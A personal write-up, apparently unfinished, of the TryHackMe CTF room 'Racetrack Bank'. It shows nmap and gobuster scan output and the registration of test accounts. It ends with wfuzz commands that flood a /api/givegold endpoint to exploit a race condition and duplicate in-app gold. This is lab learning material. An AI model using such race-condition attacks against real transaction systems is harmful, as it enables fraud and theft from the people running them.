<h1 align="center">Racetrack Bank</h1>
<p align="center">July 29, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>449</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>It's time for another heist.</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/30471e8a-3bb4-4547-aaa5-70e07e01447a"><br>
Click <a href="https://tryhackme.com/room/racetrackbank">here </a>to access this TryHackMe CTF.<br>
<img width="1200px" src=""></p>



<br>

<h2>Task 1 . Flags</h2>
<p>Hack into the machine and capture both the user and root flags! It's pretty hard, so good luck.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. User flag. Hint: <em>What does the name of the bank hint at?</em><br>
<code>_____</code></p>

<br>


<h3>Nmap</h3>

```bash
:~/RacetrackBank# nmap -sC -sV -Pn -T4 TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 51:91:53:a5:af:1a:5a:78:67:62:ae:d6:37:a0:8e:33 (RSA)
|   256 c1:70:72:cc:82:c3:f3:3e:5e:0a:6a:05:4e:f0:4c:3c (ECDSA)
|_  256 a2:ea:53:7c:e1:d7:60:bc:d3:92:08:a9:9d:20:6b:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Racetrack Bank
```

<h3>Gobuster</h3>

```bash
:~/RacetrackBank# gobuster dir -u http://TargetIP/ -w /usr/share/dirb/wordlists/common.txt -t 60 -x php,html,txt
...
/create.html          (Status: 200) [Size: 1973]
/Home.html            (Status: 302) [Size: 33] [--> /login.html]
/home.html            (Status: 302) [Size: 33] [--> /login.html]
/images               (Status: 301) [Size: 179] [--> /images/]
/Images               (Status: 301) [Size: 179] [--> /Images/]
/index.html           (Status: 200) [Size: 1542]
/Index.html           (Status: 200) [Size: 1542]
/index.html           (Status: 200) [Size: 1542]
/Login.html           (Status: 200) [Size: 1815]
/login.html           (Status: 200) [Size: 1815]
/purchase.html        (Status: 302) [Size: 33] [--> /login.html]
```

```bash
:~/RacetrackBank# gobuster dir -u http://TargetIP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 60 -x php,html,txt
...
/index.html           (Status: 200) [Size: 1542]
/images               (Status: 301) [Size: 179] [--> /images/]
/home.html            (Status: 302) [Size: 33] [--> /login.html]
/login.html           (Status: 200) [Size: 1815]
/Images               (Status: 301) [Size: 179] [--> /Images/]
/Home.html            (Status: 302) [Size: 33] [--> /login.html]
/purchase.html        (Status: 302) [Size: 33] [--> /login.html]
/Index.html           (Status: 200) [Size: 1542]
/Login.html           (Status: 200) [Size: 1815]
/create.html          (Status: 200) [Size: 1973]
/IMAGES               (Status: 301) [Size: 179] [--> /IMAGES/]
/giving.html          (Status: 302) [Size: 33] [--> /login.html]
/INDEX.html           (Status: 200) [Size: 1542]
/HOME.html            (Status: 302) [Size: 33] [--> /login.html]
/Purchase.html        (Status: 302) [Size: 33] [--> /login.html]
/Create.html          (Status: 200) [Size: 1973]
/bootstrap            (Status: 301) [Size: 185] [--> /bootstrap/]
/Bootstrap            (Status: 301) [Size: 185] [--> /Bootstrap/]
/LogIn.html           (Status: 200) [Size: 1815]
/LOGIN.html           (Status: 200) [Size: 1815]
```

```bash
:~/RacetrackBank# gobuster dir -u http://TargetIP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 60 -x php,html,txt
...
/index.html           (Status: 200) [Size: 1542]
/images               (Status: 301) [Size: 179] [--> /images/]
/home.html            (Status: 302) [Size: 33] [--> /login.html]
/login.html           (Status: 200) [Size: 1815]
/Images               (Status: 301) [Size: 179] [--> /Images/]
/Home.html            (Status: 302) [Size: 33] [--> /login.html]
/purchase.html        (Status: 302) [Size: 33] [--> /login.html]
/Index.html           (Status: 200) [Size: 1542]
/Login.html           (Status: 200) [Size: 1815]
/create.html          (Status: 200) [Size: 1973]
/IMAGES               (Status: 301) [Size: 179] [--> /IMAGES/]
/giving.html          (Status: 302) [Size: 33] [--> /login.html]
/INDEX.html           (Status: 200) [Size: 1542]
/HOME.html            (Status: 302) [Size: 33] [--> /login.html]
/Purchase.html        (Status: 302) [Size: 33] [--> /login.html]
/Create.html          (Status: 200) [Size: 1973]
/bootstrap            (Status: 301) [Size: 185] [--> /bootstrap/]
/Bootstrap            (Status: 301) [Size: 185] [--> /Bootstrap/]
/LogIn.html           (Status: 200) [Size: 1815]
/LOGIN.html           (Status: 200) [Size: 1815]
```


<h3>Web</h3>

<img width="939" height="396" alt="image" src="https://github.com/user-attachments/assets/e7ecd003-852b-4cde-b7f3-5da509333e05" />

<p>

- identified <code>/api/login</code>
</p>

<img width="896" height="486" alt="image" src="https://github.com/user-attachments/assets/b49dbf97-8509-4706-876c-73906f399df3" />


<h3>Burp Suite and FoxyProxy</h3>

<p>

- registered an account clicking <code>Create an Account</code><br>
- logged in<br>
- clicked <code>Purchase</code><br>
-  :-(   I don´t have 10,000 gold.  I just have  gold<br>
- created another account<br>
- clicked <code>Give Gold</code>
</p>


lili:password


<img width="938" height="266" alt="image" src="https://github.com/user-attachments/assets/ab5ae4d9-fc4a-423d-b300-fbcaf337ce52" />

<img width="948" height="228" alt="image" src="https://github.com/user-attachments/assets/6cc2d9da-9370-4b40-8ef3-944da5d2e9b8" />

<img width="938" height="300" alt="image" src="https://github.com/user-attachments/assets/fdda3197-eeda-47df-b990-58392b18b659" />

<img width="941" height="366" alt="image" src="https://github.com/user-attachments/assets/4cc67e39-1026-4392-b189-98c6127182a4" />

<img width="945" height="193" alt="image" src="https://github.com/user-attachments/assets/2a219e0c-96e3-49a7-a437-8d1d95f140a3" />


```bash
:~/RacetrackBank# seq 1 10000 > gold.txt
root@ip-10-10-26-32:~/RacetrackBank# ls
gold.txt
```

```bash
:~/RacetrackBank# wfuzz -u http://10.10.189.46/api/givegold -w gold.txt -H "Content-Type: application/x-www-form-urlencoded" -b "connect.sid=s%3AK19yUuRPaVHWOaQIJjrEPOdR2_bKkHIo.AhQZtFu6qz3o%2FQ8fij8CR8eliXrYiCSLmAofPVjdiQ8" -d "user=lili&amount=FUZZ"


wfuzz -u http://10.10.189.46/api/givegold -w gold.txt -H "Content-Type: application/x-www-form-urlencoded" -b "connect.sid=s%3Ar9n4UNGGpdYyFJIjdLdh0UbG0kcYv_2L.9Bibu5AKLf8kM1AK7C4nGHD02Fb7pwObPHz2kM3S8Bo" -d "user=lulu&amount=1FUZZ"

```
